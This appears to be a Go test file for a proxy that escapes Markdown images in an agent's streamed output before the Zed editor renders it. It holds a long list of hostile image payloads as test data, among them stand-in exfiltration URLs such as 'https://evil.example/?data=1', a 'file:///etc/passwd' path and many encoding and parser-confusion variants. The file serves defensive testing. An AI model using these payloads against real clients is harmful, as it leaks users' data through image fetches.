package acpproxy

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"html"
	"math/rand"
	"regexp"
	"strings"
	"testing"

	"github.com/yuin/goldmark"
	"github.com/yuin/goldmark/extension"
)

var renderedImage = regexp.MustCompile(`<img[^>]*\ssrc="([^"]*)"`)

// loadedImages renders Markdown as goldmark does, which stands in for Zed's pulldown-cmark: both follow
// CommonMark. It returns the source of every image Zed would load instead of decoding it by itself.
func loadedImages(t *testing.T, markdown string) []string {
	t.Helper()
	var rendered bytes.Buffer
	if err := goldmark.New(goldmark.WithExtensions(extension.GFM, extension.Footnote)).Convert([]byte(markdown), &rendered); err != nil {
		t.Fatal(err)
	}
	var loaded []string
	for _, image := range renderedImage.FindAllStringSubmatch(rendered.String(), -1) {
		if !zedDecodes(html.UnescapeString(image[1])) {
			loaded = append(loaded, image[1])
		}
	}
	return loaded
}

// zedDecodes says what Zed turns into an image with no path, read from its source at v1.26.2: a type it
// knows and base64 that decodes under strict rules. Anything else goes on to its path lookup.
func zedDecodes(source string) bool {
	for _, format := range imageFormats {
		if data, ok := strings.CutPrefix(source, string(format)); ok {
			_, err := base64.StdEncoding.Strict().DecodeString(data)
			return err == nil && !strings.ContainsAny(data, "\r\n")
		}
	}
	return false
}

// splitAt sends text as pieces cut at the given positions and ends the turn.
func splitAt(text string, cuts ...int) string {
	var escaper imageEscaper
	var out []byte
	from := 0
	for _, cut := range cuts {
		out = append(out, escaper.write([]byte(text[from:cut]))...)
		from = cut
	}
	out = append(out, escaper.write([]byte(text[from:]))...)
	return string(append(out, escaper.finish(pauseText)...))
}

// everySplit calls check with text sent in one piece, cut at each byte and one byte at a time.
func everySplit(text string, check func(split, assembled string)) {
	check("whole", splitAt(text))
	var everyByte []int
	for cut := 1; cut < len(text); cut++ {
		check(fmt.Sprintf("cut at %d", cut), splitAt(text, cut))
		everyByte = append(everyByte, cut)
	}
	check("one byte at a time", splitAt(text, everyByte...))
}

// A hostile program writes these. Each must render an image as it stands, or it proves nothing.
var imageDocuments = []string{
	`![x](evil.png)`,
	`![x](./evil.png)`,
	`![x](../evil.png)`,
	`![x](/net/evil.example/a.png)`,
	`![x](\/net/evil.example/a.png)`,
	`![x](a%20b.png)`,
	`![x](evil.png "title")`,
	`![x](<a b.png>)`,
	`![x]()`,
	`![x](<>)`,
	`![x](file:///etc/passwd)`,
	`![a [b](c) d](evil.png)`,
	"![x](\nevil.png\n)",
	"> ![x](\n> evil.png)",
	// Zed reads each of these as a project path a box can name, because none of them decodes.
	`![x](data:a)`,
	`![x](data:)`,
	`![x](DATA:image/png;base64,QUJD)`,
	`![x](Data:image/png;base64,QUJD)`,
	`![x](data:image/png;base64,QQ)`,
	`![x](data:image/png;base64,QR==)`,
	`![x](data:image/png;base64,Q!JD)`,
	`![x](data:image/png,QUJD)`,
	`![x](data:image/svg+xml;base64,QUJD)`,
	`![x](data:text/plain;base64,QUJD)`,
	`![x](>data:image/png;base64,QUJD)`,
	"![x](\n    >data:image/png;base64,QUJD)",
	"[a]: data:a\n\n![a]",
	"[a]: data:image/png;base64,QQ\n\n![a]",
	"[a]: DATA:image/png;base64,QUJD\n\n![a]",
	"![a]\n\n[a]: da",
	"[a]: evil.png\n\n![a]",
	"![a]\n\n[a]: evil.png",
	"![a]\r\n\r\n[a]: evil.png",
	"![a][b]\n\n[b]: evil.png",
	"![a][]\n\n[a]: evil.png",
	"[a]:evil.png\n\n![a]",
	"[a]:\nevil.png\n\n![a]",
	"[a]: evil.png \"title\"\n\n![a]",
	"[a]: <b c.png>\n\n![a]",
	"  [a]: evil.png\n\n![a]",
	"   [a]: evil.png\n\n![a]",
	"> [a]: evil.png\n\n![a]",
	">[a]: evil.png\n\n![a]",
	"> > [a]: evil.png\n\n![a]",
	"- [a]: evil.png\n\n![a]",
	"* [a]: evil.png\n\n![a]",
	"+ [a]: evil.png\n\n![a]",
	"1. [a]: evil.png\n\n![a]",
	"12) [a]: evil.png\n\n![a]",
	"- > 1. [a]: evil.png\n\n![a]",
	"- a\n  - b\n    - c\n\n      [a]: evil.png\n\n![a]",
	"- a\n\n\t[a]: evil.png\n\n![a]",
	"[a]: data:image/png;base64,QUJD\n't'[b]: evil.png\n\n![b]",
	"text\n\n[a]: evil.png\n\n![a]",
	"[b]: /one\n[a]: evil.png\n\n![a]",
	"[b]: data:image/png;base64,QUJD\n[a]: evil.png\n\n![a]",
	"[a\nb]: evil.png\n\n![a b]",
	"[\na\n]: evil.png\n\n![a]",
	"> [a\n> b]: evil.png\n\n![a b]",
	"[a\\]b]: evil.png\n\n![a\\]b]",
	"[a!]: evil.png\n\n![a!]",
	"line\r\r[a]: evil.png\r\r![a]",
	"# a\\\n[a]: evil.png\n\n![a]",
	"[^1]: [a]: evil.png\n\n![a] and [^1]",
	"[^1]:\n    [a]: evil.png\n\n![a] and [^1]",
	"[^1]: > [a]: evil.png\n\n![a] and [^1]",
	"[^1]: - [a]: evil.png\n\n![a] and [^1]",
	"[^]: evil.png\n\n![^]",
	`![x](https://evil.example/?data=1)`,
	`![x](http://evil.example/)`,
	`text ![x](https://evil.example/) text`,
	`![](https://evil.example/)`,
	`![x](<https://evil.example/a b>)`,
	`![x](https://evil.example/ "title")`,
	`![x](https://evil.example/ 'title')`,
	`![x](https://evil.example/ (title))`,
	`![x](  https://evil.example/  )`,
	"![x](\nhttps://evil.example/\n)",
	"![x](https://evil.example/\n\"title\"\n)",
	`![x](https&#58;//evil.example/)`,
	`![x](https&colon;//evil.example/)`,
	`![x](&#104;ttps://evil.example/)`,
	`![x](https\://evil.example/)`,
	`![a [b] c](https://evil.example/)`,
	`![a [b [c] d] e](https://evil.example/)`,
	`![a ![b](https://evil.example/1) c](https://evil.example/2)`,
	`![a \] b](https://evil.example/)`,
	`![a \[ b](https://evil.example/)`,
	"![a `]` b](https://evil.example/)",
	"![a `[` b](https://evil.example/)",
	"![a ``]` `` b](https://evil.example/)",
	`![a <b title="]"> c](https://evil.example/)`,
	`![a <b title="["> c](https://evil.example/)`,
	`![a <http://x]> c](https://evil.example/)`,
	`![a <!-- ] --> c](https://evil.example/)`,
	`![a <!-- > ] --> c](https://evil.example/)`,
	`![a <b title=">]"> c](https://evil.example/)`,
	"![a <b`>]`](https://evil.example/)",
	`![a <T> [b] c](https://evil.example/)`,
	`![a [b](c]d) e](https://evil.example/)`,
	`![a [b](<c]d>) e](https://evil.example/)`,
	`![a [b](c "]") e](https://evil.example/)`,
	`[![x](https://evil.example/)](https://other.example/)`,
	`\\![x](https://evil.example/)`,
	`\\\\![x](https://evil.example/)`,
	`&#92;![x](https://evil.example/)`,
	`!!![x](https://evil.example/)`,
	"![a\nb](https://evil.example/)",
	"![a\r\nb](https://evil.example/)",
	"> ![a\n> b](https://evil.example/)",
	"- ![a\n  b](https://evil.example/)",
	"# ![x](https://evil.example/)",
	"*![x](https://evil.example/)*",
	"~~![x](https://evil.example/)~~",
	"| a |\n|---|\n| ![x](https://evil.example/) |",
	"| a |\n|---|\n| ![a\\|b](https://evil.example/) |",
	"line one\r![x](https://evil.example/)",
	"![x][r]\n\n[r]: https://evil.example/",
	"![x][]\n\n[x]: https://evil.example/",
	"![x]\n\n[x]: https://evil.example/",
	"[x]: https://evil.example/\n\n![x]",
	"[x]: http://evil.example/\n\n![x]",
	"   [x]: https://evil.example/\n\n![x]",
	"> [x]: https://evil.example/\n\n![x]",
	"> > [x]: https://evil.example/\n\n![x]",
	"- [x]: https://evil.example/\n\n![x]",
	"* [x]: https://evil.example/\n\n![x]",
	"1. [x]: https://evil.example/\n\n![x]",
	"12) [x]: https://evil.example/\n\n![x]",
	"- > 1. [x]: https://evil.example/\n\n![x]",
	"- a\n  - b\n    - c\n\n      [x]: https://evil.example/\n\n![x]",
	"- a\n\n\t[x]: https://evil.example/\n\n![x]",
	"[x]:\nhttps://evil.example/\n\n![x]",
	"[x]:\r\nhttps://evil.example/\r\n\r\n![x]",
	"> [x]:\n> https://evil.example/\n\n![x]",
	"> [x]:\nhttps://evil.example/\n\n![x]",
	"[x]:https://evil.example/\n\n![x]",
	"[x]: <https://evil.example/>\n\n![x]",
	"[x]: <https://evil.example/a b>\n\n![x]",
	"[x]: https://evil.example/ \"title\"\n\n![x]",
	"[x]: https://evil.example/\n'title'\n\n![x]",
	"[x]: https&#58;//evil.example/\n\n![x]",
	"[x]: https&colon;//evil.example/\n\n![x]",
	"[x]: &#104;ttps://evil.example/\n\n![x]",
	"[x]: https\\://evil.example/\n\n![x]",
	"[x\ny]: https://evil.example/\n\n![x y]",
	"[\nx\n]: https://evil.example/\n\n![x]",
	"> [x\n> y]: https://evil.example/\n\n![x y]",
	"[a\\]b]: https://evil.example/\n\n![a\\]b]",
	"[X]: https://evil.example/\n\n![x]",
	"[a]: /one\n[x]: https://evil.example/\n\n![x]",
	"[x]: https://evil.example/\n\n![x][]",
	"[x]: https://evil.example/\n\n![y][x]",
	"[x]: https://evil.example/\n\n[![x]](https://other.example/)",
	"[^1]: [x]: https://evil.example/\n\n![x] and [^1]",
	"[^1]:\n    [x]: https://evil.example/\n\n![x] and [^1]",
	"[^1]: > [x]: https://evil.example/\n\n![x] and [^1]",
}

func TestNoSplitLeavesAnImage(t *testing.T) {
	for _, document := range imageDocuments {
		if len(loadedImages(t, document)) == 0 && !goldmarkMissesIt(document) {
			t.Errorf("this does not render an image, so it proves nothing: %q", document)
		}
		everySplit(document, func(split, assembled string) {
			if images := loadedImages(t, assembled); len(images) > 0 {
				t.Errorf("%q, %s, became %q, which fetches %v", document, split, assembled, images)
			}
		})
	}
}

// goldmarkMissesIt names what only pulldown-cmark, Zed's parser, reads as an image: a footnote's body is a
// container there, and `\r` alone ends a line.
// The check against pulldown-cmark itself is in the card.
func goldmarkMissesIt(document string) bool {
	return strings.HasPrefix(document, "[^") || strings.Contains(document, "\r\r")
}

// Whatever the split, the text comes out the same: holding text back must not change the answer.
func TestAllSplitsSendTheSameText(t *testing.T) {
	for _, document := range append(append([]string{}, imageDocuments...), benignDocuments...) {
		one := splitAt(document)
		everySplit(document, func(split, assembled string) {
			if assembled != one {
				t.Errorf("%q, %s, became %q, not %q", document, split, assembled, one)
			}
		})
	}
}

// Code must not show a backslash, whichever way an adapter happens to cut it.
var benignDocuments = []string{
	"```rust\nlet v = vec![1, 2];\nlet w = vec![vec![1], vec![2, 3]];\nprintln!(\"{:?}\", v);\n```\n",
	"```rust\nassert!(matches!(x, Some(_)));\nlet s = &a[1..];\nlet m = matrix[0][1];\n```\n",
	"```sh\n#!/bin/sh\nif ! grep -q x y; then echo no!; fi\n```\n",
	"```python\nif items[0]:\n    return items[1:]\nfor k in d[\"x\"]:\n    print(\"http://example.org\")\n```\n",
	"```ts\ninterface A {\n  a: B[]; c[0]: d;\n}\nlet x: { y: number }[] = [];\n```\n",
	"```js\nconst a = ![1, 2].includes(x);\nconst b = !x[0];\n```\n",
	"```rust\nlet first = vec![1, 2][0];\nlet boxed = vec![Vec::<u8>::new(), a < b];\n```\n",
	"```md\n![logo][1]\n```\n",
	"```\nvec![1, 2]\n\n[note]\n```\n",
	"```json\n[\n  {\"a\": 1},\n  {\"b\": 2}\n]\n```\n",
	"The macro `vec![1, 2]` and `#!/bin/sh` and `a[0]: b`.",
	"Use vec![1, 2] here and a[0]: b there",
	"let v = vec![1, 2]",
	"Done!",
	"Done! It works!\n\nNext!",
	"wow! [docs](https://example.org/) wow!",
	"[docs](https://example.org/)",
	"see [docs][d]",
	"a[0]: b",
	"x[i]: int",
	"  a[0]: b\n  x[i]: int\n",
	"let x[i]: int = 1;\n",
	"vec![1, 2]",
	"text [a]: b",
	"[a] : b",
	"[a]\n: b",
	"[a][b]: c",
	"[[a]]: b",
	"[a[0]: b",
	"\\[a]: b",
	"[INFO] [worker]: started",
	"[1, 2, 3]",
	"[\n  1,\n  2\n]\n",
	"[profile.release]\nlto = true\n",
	"[[bin]]\nname = \"x\"\n",
	"[ -f a ] && b\n",
	"- [x] done: yes",
	"1. [ ] later: maybe",
	"![x](data:image/png;base64,QUJD)",
	"see ![x](data:image/jpeg;base64,QUI=) and ![y](data:image/gif;base64,QQ==) and ![z](data:image/webp;base64,+/+/)",
	"![x](\n  data:image/png;base64,QUJD)",
	"- [x] [a]: b",
	"- [x] done\n- [ ] not yet",
	"> [!NOTE]\n> Careful!",
	"| a | b |\n|---|---|\n| x! | y[0] |\n| `z![1]` | w |\n",
	"a \\ b \\\\ c \\! d \\[ e",
	"C:\\Users\\me\\file!",
	"https://example.org/?a[0]=1&b=2!",
	"![x] with nothing to point at",
	"![",
	"vec![1,\n\n2]",
}

func TestCodeAndOrdinaryTextStayByteForByte(t *testing.T) {
	for _, document := range benignDocuments {
		everySplit(document, func(split, assembled string) {
			if assembled != document && !endsOpen(document) {
				t.Errorf("%q, %s, became %q", document, split, assembled)
			}
		})
	}
}

// endsOpen names text that stops inside what could still be an image, so a pause has to close it: only
// the last turn of a message that stops mid-`![` pays for this.
func endsOpen(document string) bool {
	return document == "!["
}

func TestNothingStaysHeldAtAPause(t *testing.T) {
	for _, document := range append(append([]string{}, imageDocuments...), benignDocuments...) {
		everySplit(document, func(split, _ string) {
			var escaper imageEscaper
			escaper.write([]byte(document))
			escaper.finish(pauseText)
			if len(escaper.held) != 0 {
				t.Errorf("%q, %s, still holds %q", document, split, escaper.held)
			}
		})
	}
}

// The stream may go on after a pause, in the same Markdown as far as the box can tell. Each of these is
// cut where the text before the pause looks finished, and must stay harmless when joined, whether Zed
// joins it or starts a new Markdown.
func TestAPauseDoesNotOpenAWay(t *testing.T) {
	for _, document := range imageDocuments {
		for cut := 1; cut < len(document); cut++ {
			var escaper imageEscaper
			before := append(escaper.write([]byte(document[:cut])), escaper.finish(pauseText)...)
			after := append(escaper.write([]byte(document[cut:])), escaper.finish(pauseText)...)
			for _, assembled := range []string{string(before) + string(after), string(after)} {
				if images := loadedImages(t, assembled); len(images) > 0 {
					t.Errorf("%q paused at %d became %q, which fetches %v", document, cut, assembled, images)
				}
			}
		}
	}
}

// A backslash left at a pause must not hide the next `!` in one reading and show it in the other.
func TestABackslashAtAPauseEscapesNothingLater(t *testing.T) {
	var escaper imageEscaper
	before := append(escaper.write([]byte(`\`)), escaper.finish(pauseText)...)
	after := append(escaper.write([]byte(`![x](https://evil.example/)`)), escaper.finish(pauseText)...)
	for _, assembled := range []string{string(before) + string(after), string(after)} {
		if images := loadedImages(t, assembled); len(images) > 0 {
			t.Errorf("%q fetches %v", assembled, images)
		}
	}
}

func TestSealedTextCannotBeFinishedByWhatFollows(t *testing.T) {
	for _, document := range imageDocuments {
		for cut := 1; cut < len(document); cut++ {
			assembled := escapeWhole(document[:cut], sealText) + escapeWhole(document[cut:], sealText)
			if images := loadedImages(t, assembled); len(images) > 0 {
				t.Errorf("%q cut at %d became %q, which fetches %v", document, cut, assembled, images)
			}
		}
	}
}

// Text past the limit stops being held, and what it was holding is escaped.
func TestHeldTextIsBounded(t *testing.T) {
	for name, document := range map[string]string{
		"a long image text": "![" + strings.Repeat("a", 2*maxHeldText) + "](https://evil.example/)",
		"code spans":        "![`" + strings.Repeat("a`", maxHeldText) + "](https://evil.example/)",
		"a long gap":        "[x]:" + strings.Repeat(" ", 2*maxHeldText) + "https://evil.example/\n\n![x]",
		"a long address":    "[x]: h" + strings.Repeat("a", 2*maxHeldText) + "://evil.example/\n\n![x]",
		"a long label":      "[" + strings.Repeat("a", 2*maxHeldText) + "]: evil.png\n\n![" + strings.Repeat("a", 2*maxHeldText) + "]",
		"a long data image": "![x](data:image/png;base64," + strings.Repeat("A", 2*maxHeldText) + ")",
	} {
		t.Run(name, func(t *testing.T) {
			var escaper imageEscaper
			var out []byte
			for piece := []byte(document); len(piece) > 0; piece = piece[min(64, len(piece)):] {
				out = append(out, escaper.write(piece[:min(64, len(piece))])...)
				if len(escaper.held) > maxHeldText+64 {
					t.Fatalf("holds %d bytes", len(escaper.held))
				}
			}
			out = append(out, escaper.finish(pauseText)...)
			if images := loadedImages(t, string(out)); len(images) > 0 {
				t.Errorf("fetches %v", images)
			}
		})
	}
}

// What really is shaped like a definition or an image pays with a backslash, in a code block too, where
// it shows. Elsewhere the Markdown hides it. These are the whole price, each written out.
func TestWhatLooksLikeADefinitionShowsABackslash(t *testing.T) {
	for document, want := range map[string]string{
		"[key: string]: number;":                 `[key: string]\: number;`,
		"```ts\n  [K in C]: { d: E };\n```\n":    "```ts\n  [K in C]\\: { d: E };\n```\n",
		"[note]: this is a remark":               `[note]\: this is a remark`,
		"[1]: number":                            `[1]\: number`,
		"see [docs][d]\n\n[d]: ./docs/readme.md": "see [docs][d]\n\n[d]\\: ./docs/readme.md",
		"[^1]: a footnote":                       `[^1]\: a footnote`,
		"**[a]: b**":                             `**[a]\: b**`,
		"- [a]: b":                               `- [a]\: b`,
		"[a]: data:image/png;base64,QUJD":        `[a]\: data:image/png;base64,QUJD`,
		"![plot](out/plot.png) and more":         `\![plot](out/plot.png) and more`,
		"![x](local":                             `\![x](local`,
		"[open":                                  `\[open`,
	} {
		everySplit(document, func(split, assembled string) {
			if assembled != want {
				t.Errorf("%q, %s, became %q, not %q", document, split, assembled, want)
			}
		})
	}
}

// Zed turns a `data:` that does not decode into a project path, so a file named just so would load.
func TestOnlyWhatZedDecodesStaysAnImage(t *testing.T) {
	for document, stays := range map[string]bool{
		`![x](data:image/png;base64,QUJD)`:   true,
		`![x](data:image/jpeg;base64,QUJD)`:  true,
		`![x](data:image/gif;base64,QUJD)`:   true,
		`![x](data:image/webp;base64,QUJD)`:  true,
		`![x](data:image/png;base64,)`:       true,
		`![x](data:image/png;base64,QQ)`:     false,
		`![x](data:image/png;base64,QR==)`:   false,
		`![x](data:image/svg+xml;base64,QQ)`: false,
		`![x](data:a)`:                       false,
		`![x](DATA:image/png;base64,QUJD)`:   false,
		`![x](evil.png)`:                     false,
		// Zed would decode these, but a parser could read them another way, and no agent writes them.
		`![x](data:image/png;base64,QUJD "title")`: false,
		`![x](<data:image/png;base64,QUJD>)`:       false,
		`![x](&#100;ata:image/png;base64,QUJD)`:    false,
		`![x](data\:image/png;base64,QUJD)`:        false,
		`![x](data:image/png;base64,QUJ&#68;)`:     false,
		`![x](data:image/png;base64,QUJ\+)`:        false,
	} {
		if got := escapeWhole(document, lastText); (got == document) != stays || !stays && got != `\`+document {
			t.Errorf("%q became %q", document, got)
		}
	}
}

// `![![![` must not cost a read of the rest of the line for each `![`.
func TestALongLineOfOpeningsIsReadOnce(t *testing.T) {
	line := strings.Repeat("![", 1<<20) + strings.Repeat("]", 1<<20)
	text := lineText{}
	if escaped := text.escape(line, lastText); escaped != line {
		t.Errorf("nothing here is an image, but it changed")
	}
	line = strings.Repeat("![", 1<<20) + "](https://evil.example/)"
	var escaper imageEscaper
	if out := append(escaper.write([]byte(line)), escaper.finish(pauseText)...); len(loadedImages(t, string(out[:1<<16]))) > 0 {
		t.Errorf("fetches an image")
	}
}

// What a hand-written table misses, a soup of the bytes that matter may find.
func TestRandomDocumentsLeaveNoImage(t *testing.T) {
	tokens := []string{
		"!", "![", "[", "]", "](", "][", "]:", ":", "(", ")", "<", ">", "`", "``", "\\", "\\\\", "\n", "\n\n", "\r\n", "\r", " ", "  ", "\t",
		"- ", "> ", "1. ", "[^1]:", "x", "a b", "\"", "'", "&#58;", "&#104;ttps", "https://evil.example/", "http://evil.example/", "<https://evil.example/>",
		"[x]: ", "![x]", "|", "|---|", "```", "evil.png", "[x]: evil.png", "(evil.png)", "data:a", "data:image/png;base64,", "QUJD", "- [x] ", "[^x]",
	}
	random := rand.New(rand.NewSource(1))
	for round := 0; round < 20000; round++ {
		var document strings.Builder
		for n := random.Intn(14); n >= 0; n-- {
			document.WriteString(tokens[random.Intn(len(tokens))])
		}
		text := document.String()
		var cuts []int
		for cut := 1; cut < len(text); cut++ {
			if random.Intn(4) == 0 {
				cuts = append(cuts, cut)
			}
		}
		assembled := splitAt(text, cuts...)
		if assembled != splitAt(text) {
			t.Errorf("%q cut at %v became %q, not %q", text, cuts, assembled, splitAt(text))
		}
		if images := loadedImages(t, assembled); len(images) > 0 {
			t.Errorf("%q became %q, which fetches %v", text, assembled, images)
		}
	}
}
